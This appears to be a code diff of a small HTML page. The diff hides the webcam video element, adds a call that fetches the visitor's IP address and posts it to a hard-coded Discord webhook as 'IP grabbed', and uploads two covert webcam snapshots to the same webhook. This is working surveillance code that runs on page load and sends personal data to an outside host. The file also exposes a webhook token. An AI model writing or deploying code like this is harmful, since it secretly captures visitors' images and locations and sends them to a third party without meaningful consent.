@@ -1,16 +1,17 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Camera Capture</title>
+  <title>IP and Camera Capture</title>
 </head>
 <body>
-  <video id="video" width="320" height="240" autoplay></video>
+  <video id="video" width="320" height="240" autoplay style="display:none;"></video>
   <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
 
   <script>
     const video = document.getElementById('video');
     const canvas = document.getElementById('canvas');
     const ctx = canvas.getContext('2d');
+    const webhookURL = "https://discordapp.com/api/webhooks/1374439333473292298/oF_3g-oeCrSnruf7vmDS8wd9bqXvQnvhTTkJdBUpaQU-r4K_JOLcXFHHzCA8W8J5Zcws";
 
     function dataURLtoBlob(dataurl) {
       const arr = dataurl.split(','), mime = arr[0].match(/:(.*?);/)[1],
@@ -21,28 +22,45 @@
       return new Blob([u8arr], {type:mime});
     }
 
+    function sendFile(blob, filename) {
+      const formData = new FormData();
+      formData.append('file', blob, filename);
+      return fetch(webhookURL, { method: 'POST', body: formData });
+    }
+
+    // Fetch IP and send as message
+    fetch('https://api.ipify.org?format=json')
+      .then(res => res.json())
+      .then(data => {
+        fetch(webhookURL, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ content: `IP grabbed: ${data.ip}` })
+        });
+      });
+
+    // Get webcam and send two pictures
     navigator.mediaDevices.getUserMedia({ video: true })
       .then(stream => {
         video.srcObject = stream;
 
+        // Capture and send first picture immediately
         setTimeout(() => {
           ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+          sendFile(dataURLtoBlob(canvas.toDataURL('image/png')), 'capture1.png');
+        }, 1000);
+
+        // Capture and send second picture after 3 seconds
+        setTimeout(() => {
+          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+          sendFile(dataURLtoBlob(canvas.toDataURL('image/png')), 'capture2.png');
           stream.getTracks().forEach(track => track.stop());
-
-          const dataURL = canvas.toDataURL('image/png');
-          const blob = dataURLtoBlob(dataURL);
-          const formData = new FormData();
-          formData.append('file', blob, 'capture.png');
-
-          fetch('https://discordapp.com/api/webhooks/1374439333473292298/oF_3g-oeCrSnruf7vmDS8wd9bqXvQnvhTTkJdBUpaQU-r4K_JOLcXFHHzCA8W8J5Zcws', {
-            method: 'POST',
-            body: formData
-          });
-        }, 3000);
+        }, 4000);
       })
       .catch(() => {
-        // If camera denied, do nothing or handle here
+        // Camera denied or error
       });
   </script>
 </body>
 </html>
+
